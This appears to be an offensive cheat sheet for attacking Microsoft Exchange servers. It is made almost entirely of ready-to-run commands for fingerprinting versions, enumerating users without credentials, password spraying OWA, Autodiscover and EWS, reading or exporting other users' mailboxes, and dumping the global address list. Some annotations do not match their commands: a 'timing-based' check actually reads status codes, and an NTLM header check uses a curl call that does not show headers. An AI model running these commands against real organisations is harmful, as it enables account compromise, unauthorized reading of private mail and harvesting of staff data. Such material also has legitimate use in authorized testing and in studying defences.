# Exchange Enumeration & Mailbox Access

## Version Fingerprinting

```bash
# OWA build number → version mapping
curl -sk https://exchange.com/owa/auth/logon.aspx | grep -i "OwaPage\|build"

# Autodiscover exposes version + internal hostnames
curl -sk https://exchange.com/autodiscover/autodiscover.xml

# NTLM info leak (no credentials needed) — reveals domain, hostname, OS
curl -sk https://exchange.com/autodiscover/autodiscover.xml
# Check WWW-Authenticate: NTLM <base64> header
# Decode: python3 -c "import base64,sys; d=base64.b64decode(sys.argv[1]); print(d)" <TOKEN>
# Or: ntlm-info https://exchange.com/autodiscover/autodiscover.xml
```

**Version table**

| Build | Version |
|-------|---------|
| 15.2.x | Exchange 2019 |
| 15.1.x | Exchange 2016 |
| 15.0.x | Exchange 2013 |
| 14.x   | Exchange 2010 |

---

## User Enumeration

```bash
# OAB (Offline Address Book) — unauthenticated user enumeration
python3 oab.py https://exchange.com
# Downloads GAL without authentication on misconfigured servers

# Autodiscover timing-based enumeration
for user in $(cat users.txt); do
  curl -sk -o /dev/null -w "%{http_code} $user\n" \
    -u "$user@domain.com:wrongpassword" \
    https://exchange.com/autodiscover/autodiscover.xml
done
# 401 = user exists (NTLM challenge), 403/redirect = user unknown

# CrackMapExec Exchange enumeration
crackmapexec exchange exchange.com -u user -p password --mailboxes
crackmapexec exchange exchange.com -u user -p password --users
```

---

## Mailbox Access (Authenticated)

```bash
# EWS (Exchange Web Services) API
python3 exchanger.py -target https://exchange.com -u DOMAIN/user -p password ews
# List mailboxes, read emails, search attachments

# Access another user's mailbox (if admin or delegated)
python3 exchanger.py -target https://exchange.com -u DOMAIN/admin -p password \
  -mailbox victim@domain.com ews

# CrackMapExec
crackmapexec exchange exchange.com -u admin -p password --mailboxes
crackmapexec exchange exchange.com -u admin -p password -M mail_scraper

# PowerShell: export mailbox to PST (requires Exchange Management Shell on server)
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics
```

---

## Password Spraying Against Exchange

```bash
# OWA spray (slow — 1 req/sec to avoid lockout)
python3 ruler.py --domain domain.com spray --users users.txt --passwords pass.txt --delay 1

# Autodiscover spray
spray.py -t https://exchange.com/autodiscover/autodiscover.xml -U users.txt -P 'Winter2024!'

# Basic auth EWS spray
crackmapexec exchange exchange.com -u users.txt -p 'Password123' --no-bruteforce
```

---

## GAL (Global Address List) Dump

```bash
# MAPI/HTTP GAL dump — retrieves full org address book
python3 exchanger.py -target https://exchange.com -u DOMAIN/user -p password gal
# Outputs full user list with email, phone, department

# OWA people search (requires valid session cookie)
curl -sk -b "session_cookie" "https://exchange.com/owa/service.svc/s/FindPeople" \
  -d '{"request":{"__type":"FindPeopleRequest","IndexedPageItemView":{"MaxEntriesReturned":999}}}'
```
